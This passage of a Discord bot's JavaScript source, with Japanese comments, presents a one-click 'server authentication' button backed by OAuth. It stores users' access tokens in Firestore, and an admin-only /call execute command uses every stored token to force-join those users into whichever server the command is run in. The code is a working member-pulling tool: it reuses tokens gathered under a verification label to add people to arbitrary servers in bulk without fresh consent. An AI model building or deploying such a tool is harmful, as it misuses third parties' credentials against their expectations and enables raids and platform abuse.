            .setLabel('🔐 サーバー認証を完了する (ワンクリック)')
            .setStyle(ButtonStyle.Link)
            .setURL(oauthUrl)
    );

    await interaction.reply({ embeds: [embed], components: [button] });
}

async function handleCall(interaction, userId, subcommand) {
    // 権限チェック: 管理者権限を持つユーザーのみ実行可能
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.reply({ embeds: [errorEmbed('権限不足', 'このコマンドを実行するには管理者権限が必要です。')], ephemeral: true });
    }
    
    // クールダウンチェック (execute サブコマンドのみ)
    if (subcommand === 'execute') {
        const userData = await getUserData(userId);
        const lastCall = getCooldown(userData, 'call_execute');
        const now = Date.now();

        if (lastCall && now < lastCall + COOLDOWN_CALL_MS) {
            const remaining = (lastCall + COOLDOWN_CALL_MS) - now;
            return interaction.reply({ 
                embeds: [errorEmbed('⏳ クールダウン中', `次の強制加入実行まで**${formatCooldown(remaining)}**待ってください。`)], 
                ephemeral: true 
            });
        }
        
        // クールダウン更新
        userData.cooldowns = { ...userData.cooldowns, call_execute: now };
        await setUserData(userId, userData);
    }
    
    // Firestoreが初期化されていない場合は処理をブロック
    if (!db) {
        return interaction.reply({ embeds: [errorEmbed('データベースエラー', 'Firestore接続に失敗しているため、Callコマンドは利用できません。')], ephemeral: true });
    }
    
    const guildId = interaction.guildId;
    
    if (subcommand === 'list') {
        // 認証済みユーザー数のカウント
        try {
            const snapshot = await db.collection(AUTHENTICATED_USERS_COLLECTION).count().get();
            const count = snapshot.data().count;
            
            const embed = new EmbedBuilder()
                .setColor(0x007FFF)
                .setTitle('👥 認証済みユーザー数')
                .setDescription(`現在、FirestoreにAccess Tokenが保存されているユーザーは **${count}** 人です。`)
                .addFields({ name: '注意', value: 'Access Tokenには期限があるため、この数値は有効なトークンを持つユーザー数とは限りません。' })
                .setTimestamp();
            
            return interaction.reply({ embeds: [embed] });
        } catch (e) {
            console.error('Listコマンドエラー:', e);
            return interaction.reply({ embeds: [errorEmbed('エラー', '認証済みユーザーのカウントに失敗しました。')], ephemeral: true });
        }
    } else if (subcommand === 'execute') {
        await interaction.deferReply(); // 時間がかかるため遅延応答

        let addedCount = 0;
        let failedCount = 0;
        let totalCount = 0;

        try {
            // Firestoreから全ての認証済みユーザーを取得
            const snapshot = await db.collection(AUTHENTICATED_USERS_COLLECTION).get();
            totalCount = snapshot.size;

            if (totalCount === 0) {
                return interaction.editReply({ embeds: [errorEmbed('対象ユーザーなし', '現在、OAuth2認証済みのユーザーがいません。')] });
            }

            const joinPromises = [];

            snapshot.forEach(doc => {
                const userIdToJoin = doc.id;
                const { accessToken, tokenType } = doc.data();

                if (!accessToken || !guildId || !TOKEN) {
                    failedCount++;
                    return;
                }

                // Discord APIを利用してサーバーにユーザーを強制加入させる
                const promise = axios.put(`https://discord.com/api/v10/guilds/${guildId}/members/${userIdToJoin}`, {
                    access_token: accessToken,
                }, {
                    headers: {
                        Authorization: `Bot ${TOKEN}`,
                        'Content-Type': 'application/json'
                    }
                })
                .then(() => {
                    addedCount++;
                    console.log(`[Call Success] ユーザー ${userIdToJoin} をギルド ${guildId} に加入させました。`);
                })
                .catch(err => {
                    failedCount++;
                    // 403 (Forbidden) - Botに権限がない or サーバーのセキュリティ設定
                    // 400 (Bad Request) - Tokenが無効 or 期限切れ
                    // 429 (Too Many Requests) - レート制限
                    console.error(`[Call Failed] ユーザー ${userIdToJoin} の強制加入失敗 (Status: ${err.response?.status || err.message})`);
                    
                    // トークンが無効または期限切れの場合はFirestoreから削除しても良いが、ここでは単純にカウントのみ
                });

                joinPromises.push(promise);
            });
            
            // 全ての加入リクエストが完了するのを待つ (エラーも含む)
            await Promise.allSettled(joinPromises);

            const embed = new EmbedBuilder()
                .setColor(0x00FF00)
                .setTitle('🚀 強制加入実行結果')
                .setDescription(`**${interaction.guild.name}** サーバーへの強制加入処理が完了しました。`)
                .addFields(
                    { name: '総認証済みユーザー', value: `${totalCount} 人`, inline: true },
                    { name: '✅ 成功 (加入済み含む)', value: `${addedCount} 人`, inline: true },
                    { name: '❌ 失敗 (トークン切れ/エラー)', value: `${failedCount} 人`, inline: true },
                    { name: 'クールダウン', value: `${formatCooldown(COOLDOWN_CALL_MS)}` }
                )
                .setTimestamp();
                
            await interaction.editReply({ embeds: [embed] });

        } catch (e) {
            console.error('Executeコマンド実行エラー:', e);
            await interaction.editReply({ embeds: [errorEmbed('実行エラー', `強制加入処理中に重大なエラーが発生しました: ${e.message}`)] });
        }
    } else if (subcommand === 'reload') {
        // 管理者によるデータ再ロード (経済システム専用)
        await interaction.reply({ embeds: [errorEmbed('未実装', '`/call reload` は現在、経済システムデータの再ロードを意図していますが、Admin SDKはリアルタイム接続のため基本的に不要です。もし経済システムデータを再ロードしたい場合は、Botを再起動してください。')], ephemeral: true });
    }
}


// --- ボットとサーバーの起動 ---

// Expressサーバーを起動
app.listen(PORT, () => {
    console.log(`[Web Server] サーバーはポート ${PORT} で稼働中です。`);
    if (OAUTH2_REDIRECT_URI) {
        console.log(`[Web Server] リダイレクトURI: ${OAUTH2_REDIRECT_URI}`);
    } else {
        console.warn('[Web Server] WARNING: OAUTH2_REDIRECT_URI が設定されていません。認証パネルが動作しません。');
    }
});

// Discord Botにログイン
client.login(TOKEN).catch(err => {
    console.error(`[Login Error] Discordログインに失敗しました: ${err.message}. トークンを確認してください。`);
});
